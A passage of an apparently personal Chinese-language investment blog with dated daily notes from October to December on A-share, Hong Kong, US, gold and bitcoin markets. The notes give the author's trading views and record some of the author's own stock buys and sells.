title="A股"></a>A股</h4><p>今天跳水杀跌小盘股后，收市庙堂之上直接放出重磅消息，港股和A50暴力拉升近5%，明天的开盘必然是大涨，目前观察资金活跃度和回落承接力度，如果出现超级大阳线谨慎做好小T，对于一些价值较低的股票现在是最好的出清机会，关注行情主线重点布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1209.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-7"><a href="#全球-7" class="headerlink" title="全球"></a>全球</h4><p>黄金走出一段震荡后又有冲高的迹象，前高是早晚会突破的，在跨年之前国际市场应该不会有太大波动，继续观察即可。</p><h4 id="策略-35"><a href="#策略-35" class="headerlink" title="策略"></a>策略</h4><p>观察指数强度和量能是否充沛，寻求主线品种，可以适当做T但不用大幅斩仓，涨到一定位置注意止盈。</p><h3 id="12月6日-周五"><a href="#12月6日-周五" class="headerlink" title="12月6日 周五"></a>12月6日 周五</h3><h4 id="A股-177"><a href="#A股-177" class="headerlink" title="A股"></a>A股</h4><p>大盘似有突破的迹象！今天上午突然放量大涨，消费题材和权重题材均有资金涌入，可见有刺激基本面的预期存在。但目前人民币汇率和大宗商品并没有很大的波动，说明一致性并没有形成，除非各项指标均出现向好迹象，否则继续做高低切换布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1206.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-8"><a href="#全球-8" class="headerlink" title="全球"></a>全球</h4><p>比特币跳水回落，目前国际局势趋于稳定，继续观察贵金属和大宗商品的走势，等待变盘节点的出现。</p><h4 id="策略-36"><a href="#策略-36" class="headerlink" title="策略"></a>策略</h4><p>今天平均股价表现明显弱于大盘指数，说明在利好催动下资金进行了高低切换，叠加年底业绩雷，近期对妖股炒作要保持谨慎，同时对各大题材的龙头保持谨慎乐观的态度做止盈和低吸的动作。</p><h3 id="12月5日-周四"><a href="#12月5日-周四" class="headerlink" title="12月5日 周四"></a>12月5日 周四</h3><h4 id="A股-178"><a href="#A股-178" class="headerlink" title="A股"></a>A股</h4><p>大盘又到收敛三角形末端，下周大概率迎来变盘窗口。但商品期货和国债指数继续打压A股预期，除非会议释放巨大利好，否则不看大盘会变盘大幅向上。目前领涨的依然是概念炒作和部分妖股，大盘科技股均没有亮眼的表现，目前继续做高低位轮动，持仓收益高的股票可以向亏损票和未持有超跌板块加仓。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1205.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-9"><a href="#全球-9" class="headerlink" title="全球"></a>全球</h4><p>美股继续表现，英伟达大涨，比特币成功站上十万美元，特朗普交易策略还在延续，目前的关键节点在1月份上台，之后A股也可能因为关税政策发生巨震，国外目前只看不做，继续看好黄金当前的投资价值。</p><h4 id="策略-37"><a href="#策略-37" class="headerlink" title="策略"></a>策略</h4><p>近期openAI发布会，继续关注AI应用的表现，目前浪潮信息、中科曙光等算力龙头和光伏板块进入超跌区，近期可以开始布局。</p><h3 id="12月4日-周三"><a href="#12月4日-周三" class="headerlink" title="12月4日 周三"></a>12月4日 周三</h3><h4 id="A股-179"><a href="#A股-179" class="headerlink" title="A股"></a>A股</h4><p>防守类品种继续支撑指数，中国神华暴涨，题材股概念股全线大跌，国债大涨，不知道是在消化未知利空还是行情就此结束，但目前国债和汇率的走势让人十分担忧指数的空间。但只要经济会议利好没有落地指数的空间也不会很大，短期内保持警惕但不宜大幅看空，少动多看即可。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1204.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-10"><a href="#全球-10" class="headerlink" title="全球"></a>全球</h4><p>美股继续强势，英伟达依然是全球最受瞩目的股票，欧美市场持续创下新高，但经济基本面却令人担忧，目前继续以建仓黄金和观察美股情绪为主题。</p><h3 id="12月3日-周二"><a href="#12月3日-周二" class="headerlink" title="12月3日 周二"></a>12月3日 周二</h3><h4 id="A股-180"><a href="#A股-180" class="headerlink" title="A股"></a>A股</h4><p>今日防守类品种表现支撑盘面，下午未知利好催动大盘突然拉升，但以中科曙光为代表下午大幅跳水，可能与制裁有关，对这类高位大盘股还是要早日止盈，继续做板块轮动交易直到会议期间。目前大盘受限于汇率弱势，指数机会很小，不宜抱有短期过高的期待。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1203.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-11"><a href="#全球-11" class="headerlink" title="全球"></a>全球</h4><p>美联储释放降息预期，全球主要资本市场和贵金属小幅拉升，目前黄金仍处在可以布局的区间，可以继续配置。</p><h3 id="12月2日-周一"><a href="#12月2日-周一" class="headerlink" title="12月2日 周一"></a>12月2日 周一</h3><p>A股目前有明显的高低切换现象，尤其是大盘高位股，对这类需要早日做止盈操作。</p><h3 id="11月29日-周五"><a href="#11月29日-周五" class="headerlink" title="11月29日 周五"></a>11月29日 周五</h3><p>A股还处在反弹段落中，在十二月会议利好落地之前可以继续高仓位配置。</p><h3 id="11月28日-周四"><a href="#11月28日-周四" class="headerlink" title="11月28日 周四"></a>11月28日 周四</h3><h4 id="A股-181"><a href="#A股-181" class="headerlink" title="A股"></a>A股</h4><p>今日的典型特点是机构继续不愿出来干活拉升大盘股，抱团寒武纪，但半导体两个月月线走出射击之星，需要保持警惕。目前妖股持续炒作，但没有基本面的支撑，以谷子经济为代表实际上是在做一些边角余料的补涨，追涨这些题材要注意尽早止盈，游资的持续性难以预计。明天的走势将会十分关键，盯住周三阳线半分位是否能守住，如果情绪出现退潮则十二月布局大盘的机会很小。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1128.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-12"><a href="#全球-12" class="headerlink" title="全球"></a>全球</h4><p>黄金持续反弹，特朗普交易对目前黄金的走势好像没有起到压制作用，场内标普ETF诡异出现飙涨，切勿跟风。</p><h3 id="11月27日-周三"><a href="#11月27日-周三" class="headerlink" title="11月27日 周三"></a>11月27日 周三</h3><h4 id="A股-182"><a href="#A股-182" class="headerlink" title="A股"></a>A股</h4><p>ETF期权行情再次应验！在当前的震荡非单边市场，关注股指期货交割和ETF期权交割周期对交易决策有重要意义。今日大资金进场，短期观察成交量是否稳健，对指数空间没有过高的期待，盘中观察到风险该止盈就止盈，关注十二月跨年妖股炒作，可以适当博弈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1127.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-13"><a href="#全球-13" class="headerlink" title="全球"></a>全球</h4><p>美股继续强势，国内部分ETF继续溢价炒作，继续保持理性。目前日本市场的价值较高可以持续观察，黄金进一步反弹，等待C浪下杀的出现可以开始做长期持仓的布局。</p><h3 id="11月26日-周二"><a href="#11月26日-周二" class="headerlink" title="11月26日 周二"></a>11月26日 周二</h3><h4 id="A股-183"><a href="#A股-183" class="headerlink" title="A股"></a>A股</h4><p>今日持续缩量，妖股疑似有退潮现象，但向下空间越来越小了，保住本金等待下一波反弹即可，下一波宜激进交易并观察情绪。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1126.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-14"><a href="#全球-14" class="headerlink" title="全球"></a>全球</h4><p>美股继续表现，贸易大棒挥舞起来，美元再度走强，黄金性价比逐渐凸显，近日可以开始布局了。</p><h3 id="11月25日-周一"><a href="#11月25日-周一" class="headerlink" title="11月25日 周一"></a>11月25日 周一</h3><h4 id="A股-184"><a href="#A股-184" class="headerlink" title="A股"></a>A股</h4><p>今日国内主要期货大幅走弱且国债走高，可能与经济数据没有显著好转有关，指数短期受到压制，大机会还未出现，但并不用悲观，向下空间有限而机会越来越大，短期锁仓不动即可，近期固态电池和AI应用走强，半导体偏弱，短期内可以继续布局科创芯片的反弹。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1125.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-15"><a href="#全球-15" class="headerlink" title="全球"></a>全球</h4><p>地缘局势缓和，黄金大幅下杀，基本符合此前无法走一波流的判断，国内金价在600元附近可以开始买入。港股恒生指数已经跌回了国庆行情启动前，机构和国际资本的态度一目了然。目前美股依然进行特朗普交易，短期走强概率高，但风险只会越来越近，目前认为只有在下跌当中才有短期博弈的机会。</p><h3 id="11月22日-周五"><a href="#11月22日-周五" class="headerlink" title="11月22日 周五"></a>11月22日 周五</h3><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>人晕了，尊重市场敬畏市场。</p><h3 id="11月21日-周四"><a href="#11月21日-周四" class="headerlink" title="11月21日 周四"></a>11月21日 周四</h3><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>盘中震荡波动率小，本周持续缩量没有市场主线，下周期权交割危险即将来临。目前权重没有成交量，妖股继续炒作，变盘点可能随时来临。国际市场黄金持续强势，但不认为就此一波创下新高，考虑在下一波下杀中布局，600元&#x2F;克附近风险较小。港股持续走弱足以说明机构对基本面的态度，尽量规避相关品种的布局，继续在妖股、情绪科技股和电信石油等板块做调仓，持续关注成交量。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1121.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月20日-周三"><a href="#11月20日-周三" class="headerlink" title="11月20日 周三"></a>11月20日 周三</h3><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>又追进去了…在当前流动性充沛的格局下，大盘股和指数受到基本面的压制，持有价值不大，但市场炒作依然在持续，最近要改变交易风格，可以考虑适当追涨人气股，不要在震荡格局的股票中站岗太久，现在很多股票超跌之后又会有力量拉回，进行进行适当补仓。</p><h3 id="11月19日-周二"><a href="#11月19日-周二" class="headerlink" title="11月19日 周二"></a>11月19日 周二</h3><h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><p>午后大盘暴力拉升，且不带量，做多一致性强，尤其以题材股拉升幅度大。目前无法确定反弹的持续性，除非观察到明天量能补足，题材走势依然坚挺，则新的反弹段落可能成立。今日进行了清仓式离场，短期不宜追高，以今日清仓点位为基本加仓线，目前可喜的是大盘仍然有做多力量，短期风险不大，黄金依然有5%以上的做多空间，在股市看不到确定性时可以适当布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1119.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月18日-周一"><a href="#11月18日-周一" class="headerlink" title="11月18日 周一"></a>11月18日 周一</h3><h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>今日各大指数继续下跌破位，板块割裂严重，并且伴随的三日的双创大跌但却没有恐慌盘的涌出，则见底机会难以显现，目前需要保持高度谨慎，减少科技情绪板块的持仓和龙头妖股的跟风，寻找稳健的投资机会。部分盈利可以往黄金等地方布局，继续看涨明年的黄金市场。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1118.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月15日-周五"><a href="#11月15日-周五" class="headerlink" title="11月15日 周五"></a>11月15日 周五</h3><h4 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h4><p>今日杀穿20日线，各大板块和许多人气股票跳水打破上涨趋势，同时有恐慌盘涌出但承接力量不强，大盘形势仍然充满忧虑。目前特朗普交易趋于末端，美元指数来到重压，短期会有新的投资机会显现，但目前国内市场需要调整乐观程度，从坚定持筹改为高抛低吸和轮动交易。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1115.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月14日-周四"><a href="#11月14日-周四" class="headerlink" title="11月14日 周四"></a>11月14日 周四</h3><h4 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h4><p>退潮和避险情绪浓厚，赛道股全线杀跌，但指数还未破位，周级别五均线仍然坚挺，未来两个交易日的表现十分关键，如果在20日线能够企稳则问题不大，但港股受制于强势美元交易影响大幅杀跌，贵金属也表现不佳，以浪潮信息为代表的人工智能龙头连续收三根上影线后大幅下跌，值得吸取教训。目前市场情绪很受影响，需要保持警惕，不宜大幅调整仓位比例。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1114.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月13日-周三"><a href="#11月13日-周三" class="headerlink" title="11月13日 周三"></a>11月13日 周三</h3><h4 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h4><p>今日神秘资金出手托举中特估，中字头股票集体大涨支撑盘面，前期妖股高位股持续退潮，既然今天撑盘品种已经表现，短期内没什么观察空间，继续盯紧科创50和中证1000是否强势突破1008高点，跟踪炒作主线，最近以观察为主直到变盘信号出现。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1113.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月12日-周二"><a href="#11月12日-周二" class="headerlink" title="11月12日 周二"></a>11月12日 周二</h3><h4 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h4><p>需要提高警惕了。今日资金计价强美元前景，铜价走低贵金属比特币人民币汇率全线走低，港股暴跌跌穿箱体，继续观察两日修复和抵抗力度，跟踪美联储12月态度和美国经济数据，如果指数继续走弱可以寻找没有突破1008高点的题材进行博弈，科技股继续关注国产替代人工智能概念，减少高位股配置仓位，如果情绪退潮可以考虑布局超跌撑盘品种。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1112.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月11日-周一"><a href="#11月11日-周一" class="headerlink" title="11月11日 周一"></a>11月11日 周一</h3><h4 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h4><p>利好落地，资金继续交易牛市预期。目前科创50即将逼近1009前高，套牢盘全部释放完毕，如果成功突破则半导体的行情将继续持续。虽然近日新半军已经有了巨大的上涨，但仍有继续博弈的空间，目前看大盘受制于权重股和消费股继续走高位震荡，题材机会依然存在，目前继续关注人工智能和半导体产业链，近日互联网巨头财报也将发布，恒生科技目标位4800点做减仓动作。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1111.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月8日-周五"><a href="#11月8日-周五" class="headerlink" title="11月8日 周五"></a>11月8日 周五</h3><h4 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h4><p>天亮放水已然落地，资金抢跑激烈，大盘走出放量滞涨，A50大幅下杀，下周一要规避风险。目前对大盘空间不再有较高预期，但成交量决定了一定有题材会继续炒作，继续寻找没有走二波的题材。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1108.png" srcset="/img/loading.gif" lazyload></p><h3 id="见证历史"><a href="#见证历史" class="headerlink" title="见证历史"></a>见证历史</h3><p>明天即将见证中国最大放水，股市也将迎来更大的疯狂，机构大资金很可能依然是跑路格局，最终是谁接到最后一棒，是谁跟着资金的狂热鸡犬升天，就看明天的演绎。</p><p>人生南北多歧路，君向潇湘我向秦。</p><h3 id="11月7日-周四"><a href="#11月7日-周四" class="headerlink" title="11月7日 周四"></a>11月7日 周四</h3><h4 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h4><p>A股情绪已经点燃，证券现涨停潮，指数剑指前高，明日大规模刺激政策即将落地，美联储凌晨也将公布利率决议，目前大概率有一个指数冲高的动作，但机构依然在砸盘做空，指数前高聚集了大量套牢盘，今日的资金却显现了很大的诚意，目前的策略是继续在科技股博弈炒作空间，用两到三成仓位尝试跨年妖股行情。主题以金融科技和旅游消费为主。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1107.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月6日-周三"><a href="#11月6日-周三" class="headerlink" title="11月6日 周三"></a>11月6日 周三</h3><h4 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h4><p>大选落幕，美元极速升值，黄金回调，非美货币下跌，今天一定有大量资金恐慌汇率和下一任政府的贸易政策而出逃，但好在并没有走出放量滞涨，妖股炒作逐渐退潮，新半军依然强势，先继续持有至周五美联储议息落地和资金对人常会利好即将落地的态度，如果仍没有挑战1008的动作则要考虑减仓动作，但成交量仍在，国产替代概念还有炒作空间，可以继续博弈概念股和资源股的上行机会。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1106.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月5日-周二"><a href="#11月5日-周二" class="headerlink" title="11月5日 周二"></a>11月5日 周二</h3><h4 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h4><p>有效突破！今日各大指数楔形整理结构变盘向上突破，大宗商品以铜价为代表也出现向上突破，同时A股伴随着放量一路拉高，做多情绪浓烈，等待明日大选结果揭晓，随时观察汇率变动和牛市旗手如东方财富、科技股龙头的1008套牢盘是否放出，继续满仓观察。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1105.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月4日-周一"><a href="#11月4日-周一" class="headerlink" title="11月4日 周一"></a>11月4日 周一</h3><h4 id="总结-14"><a href="#总结-14" class="headerlink" title="总结"></a>总结</h4><p>今天修复周五下跌，机构票白马股受到追捧，高位妖股今天见证地天板，在利好落地之前继续持有观察即可。目前人民币汇率和黄金电子盘机会初现，等待大选巨幅震荡中博弈黄金买入节点。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1104.png" srcset="/img/loading.gif" lazyload></p><h3 id="11月1日-周五"><a href="#11月1日-周五" class="headerlink" title="11月1日 周五"></a>11月1日 周五</h3><h4 id="总结-15"><a href="#总结-15" class="headerlink" title="总结"></a>总结</h4><p>今天的行情非常吊诡，债市惊为天人地预测拉升的同时情绪退潮，两日放量滞涨后今日双创下杀破位，高位妖股大批按下核按钮，可能与下周的巨大变局有关，资金大幅撤离避险，也有可能是杀跌洗盘为下周的拉升提供空间，有利的一面即是汇率和港股都没有出现大问题。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1101.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月31日-周四"><a href="#10月31日-周四" class="headerlink" title="10月31日 周四"></a>10月31日 周四</h3><h4 id="大盘"><a href="#大盘" class="headerlink" title="大盘"></a>大盘</h4><p>今天小盘股表现可圈可点，情绪受到光伏半导体的带动，走出一根企稳阳线，但是权重迟迟没有表现，可见大钱依然非常谨慎，主要是热钱和短线资金在进行博弈，目前依然相信科技主线，继续持有走二波趋势的股票，美股和港股没有很大的价值空间，继续在A股进行追踪热点的操作，等待下周百年未有之大变局的关键节点的具体动向明朗。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1031.png" srcset="/img/loading.gif" lazyload></p><h4 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h4><p>今天睡着了没有交易，许多高位股在下午炸板可见有资金在跑路，明日妖股如果走势危险则要考虑止盈操作。</p><h3 id="10月30日-周三"><a href="#10月30日-周三" class="headerlink" title="10月30日 周三"></a>10月30日 周三</h3><h4 id="大盘-1"><a href="#大盘-1" class="headerlink" title="大盘"></a>大盘</h4><p>今日A股下破20日线，午盘疑似国家队出手拉动指数，本周前三个交易日均没有主线出现，半导体持续弱势，新能源也没有带头方向，金融更是没有大资金抢筹，目前看是否能在20日线得到有效支撑走一波百点行情，如果明后两天继续下跌，说明庙堂之上对下周利好有充分信心，则宜继续做多。三季度业绩报也已公布完毕，目前最令人疑虑的是港股自10月8日见顶后再也没有波段行情，可见机构的态度，而A股高位妖股却在持续炒作，要继续追踪人民币汇率和大盘成交量以警惕风险。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1030.png" srcset="/img/loading.gif" lazyload></p><h4 id="交易-1"><a href="#交易-1" class="headerlink" title="交易"></a>交易</h4><ul><li>工业富联在25元盘整了许久，难有向上加速预期，利润空间不大，可以早日清仓，今日卖出5成仓位。</li><li>前两日埋伏的低空经济概念股今日封板涨停，今日卖出5成仓位，近日回调则止盈，加速则继续持有。</li><li>华东重机今日多次炸板，昨天尾盘跳水，今日清仓止盈。</li><li>买入大唐电信和西安饮食，博弈妖股持续炒作。</li></ul><h3 id="10月29日-周二"><a href="#10月29日-周二" class="headerlink" title="10月29日 周二"></a>10月29日 周二</h3><h4 id="总结-16"><a href="#总结-16" class="headerlink" title="总结"></a>总结</h4><p>盘后突传刺激具体数额小作文，A50借势拉升，但并没有爆拉超过3%，消息真实性存疑，持续跟踪晚间中概股和人民币汇率的波动，目前继续走板块轮动格局，少动多看，维持港A股继续宽幅震荡直到大选结果落地再做判断，跟踪高位炒作股和低位大央企的价格变化。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1029.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月28日-周一"><a href="#10月28日-周一" class="headerlink" title="10月28日 周一"></a>10月28日 周一</h3><h4 id="总结-17"><a href="#总结-17" class="headerlink" title="总结"></a>总结</h4><p>今天的行情有些无聊，权重龙头并没有什么行情，但小票鸡犬升天，可见大资金非常谨慎，但市场短线炒作非常疯狂，成交量没有萎缩，就不用担心出现暴跌。最值得关注的是原油价格今日暴跌，但目前地缘环境并没有缓和之势，国际资本交易未知预期，目前静待11月海对面大选结果和人常会政策落地。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1028.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月25日-周五"><a href="#10月25日-周五" class="headerlink" title="10月25日 周五"></a>10月25日 周五</h3><h4 id="总结-18"><a href="#总结-18" class="headerlink" title="总结"></a>总结</h4><p>千呼万唤始出来！人常会定档，究竟有多大利好就看11月美国大选结果和刺激政策落地。目前不宜以走熊眼光看待，继续满仓守候，但是继续坚持盘中做T思维。今日又走出午盘拉高下午回落走势，做T可以显著降低持仓成本，近两周可以继续这样操作。今日最大的亮点是上证指数直逼箱体上沿位，圆弧底形态初见端倪，继续以科技为主线，板块会持续轮动，不宜追高，仅在持仓内反复做T。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1025.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月24日-周四"><a href="#10月24日-周四" class="headerlink" title="10月24日 周四"></a>10月24日 周四</h3><h4 id="总结-19"><a href="#总结-19" class="headerlink" title="总结"></a>总结</h4><p>变盘时刻已经来临！今日下跌之后，各大指数五日线悉数走平，机构票有走熊之势，地缘环境风声鹤唳，港股跟随美股和早盘亚洲盘下跌，贵金属昨晚下跌后又大幅拉升，美国大选将近，应该提高避险意识，切忌追高，继续持仓观察，盘中可以考虑做T降低成本。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1024.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月22日-周二"><a href="#10月22日-周二" class="headerlink" title="10月22日 周二"></a>10月22日 周二</h3><h4 id="总结-20"><a href="#总结-20" class="headerlink" title="总结"></a>总结</h4><p>今日北证50见出高位下影线，短炒品种摁下核按钮，权重修复带动题材弱势修复，科创50如期下跌修复5日线乖离率，题材轮动基本结束，接下来就是选择方向之时。目前的中短线很难直接走熊，但由于港股和宁王等成交量已经亮明了机构的态度，暴涨也几乎不可能，最好的预期是大盘走ABC段落式反弹，在3150-3350之间宽幅震荡，科创50继续走二波见M头，最需要关注的是美国选情和人常会议最终天量的放水政策落地，目前基本面未见反转，不宜以牛市的眼光看待。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1022.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月21日-周一"><a href="#10月21日-周一" class="headerlink" title="10月21日 周一"></a>10月21日 周一</h3><h4 id="总结-21"><a href="#总结-21" class="headerlink" title="总结"></a>总结</h4><p>今天的金价实在疯狂，已经连涨近十个交易日，年内涨幅已超过30%，资金究竟在计价什么难以判断，但避险情绪浓厚则在资本市场更加需要保持谨慎，今天A股也是一波拉升之后大幅回落，可喜的是科创50今日已经在解放8日套牢盘，目前有大抛压实属正常，但也有放量滞涨之嫌，近日可以适当减仓，理性追高。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1021.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月18日-周五"><a href="#10月18日-周五" class="headerlink" title="10月18日 周五"></a>10月18日 周五</h3><h4 id="总结-22"><a href="#总结-22" class="headerlink" title="总结"></a>总结</h4><p>下午疯狂！大家长发话提振科技股，科创50暴涨，半导体龙头纷纷涨停，叠加交割结束可以判断有大资金入场，仿佛牛市回来了。今日抢筹到了科创芯片ETF，下周一预计还有拉升行情，持续关注周末消息和周一早盘资金态度，目前新能源光伏等行业表现欠佳，后市根据大盘强度考虑高低切换还是由弱转强，目前持仓布局较为合理，但要注意盘中风险，避免不理性的追涨。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1018.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月17日-周四"><a href="#10月17日-周四" class="headerlink" title="10月17日 周四"></a>10月17日 周四</h3><h4 id="总结-23"><a href="#总结-23" class="headerlink" title="总结"></a>总结</h4><p>今天资金计价未知消息，商品期货暴跌，大盘也跌破3200点未获强力接盘，近日持续没有确定的放水利好放出，科技股受支撑没有跟随下跌，但情绪未见好转，目前看20日线能否企稳反弹，随时关注避险信号。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1017.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月15日-周二"><a href="#10月15日-周二" class="headerlink" title="10月15日 周二"></a>10月15日 周二</h3><h4 id="总结-24"><a href="#总结-24" class="headerlink" title="总结"></a>总结</h4><p>今天由于大放水预期推后或落空，指数大幅杀跌，吞没昨天所有涨幅，各大指数股票击穿十日线，杀跌情绪化过头。目前看上证指数明日能否企稳，目前不看跌穿20日线，对行情继续保持乐观，但整体是一个箱体震荡格局，在3150-3350间做低吸高抛动作，除非出现大利好和大利空才会彻底改变判断。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1015.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月14日-周一"><a href="#10月14日-周一" class="headerlink" title="10月14日 周一"></a>10月14日 周一</h3><h4 id="总结-25"><a href="#总结-25" class="headerlink" title="总结"></a>总结</h4><p>在周六财政部发布会预期管理的利好之后，A股短期风险不大，在上午大盘构筑W底之后，双创强势反弹，大量股票在十日线企稳，并未受到海峡局势的影响，走出一根漂亮的阳线，成交量有所放大，股市短期活跃性可持续，看近两日能否站回五日线确立强势，并结合近日的经济数据进行适当的调仓。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1014.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月10日-周四"><a href="#10月10日-周四" class="headerlink" title="10月10日 周四"></a>10月10日 周四</h3><h4 id="总结-26"><a href="#总结-26" class="headerlink" title="总结"></a>总结</h4><p>今日各大指数继续向五日线回调，神秘资金出手拉升中字头撑指数，防止一浪回调过大。目前的行情扑朔迷离，只能判断应该不会走A顶，但是否是牛市启动还得看财政政策发力，近日疯牛行情结束之后并没有强力的承接资金，可见大钱仍在观望。目前有维护资本市场的意图，健康的长牛逻辑仍未证伪，但仍然有很大忧虑。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1010.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月9日-周三"><a href="#10月9日-周三" class="headerlink" title="10月9日 周三"></a>10月9日 周三</h3><h4 id="总结-27"><a href="#总结-27" class="headerlink" title="总结"></a>总结</h4><p>卑劣！两根巨量阴线下来，无数新入场资金被套，虽然盘中坚挺的半导体板块还有上涨机会，但券商等已经分化，赛道股向跌停逼近。目前无法判断是国家意志控制疯牛行情还是大资金借利好出货，短期应该会有弱势修复，如果跌到十日线还没有强力支撑就不能留恋，迅速离场了。港股也是同理，如果在二十日线仍然没有资金承接，则很可能这一波超级反弹就此结束。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1009.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月8日-周二"><a href="#10月8日-周二" class="headerlink" title="10月8日 周二"></a>10月8日 周二</h3><h4 id="总结-28"><a href="#总结-28" class="headerlink" 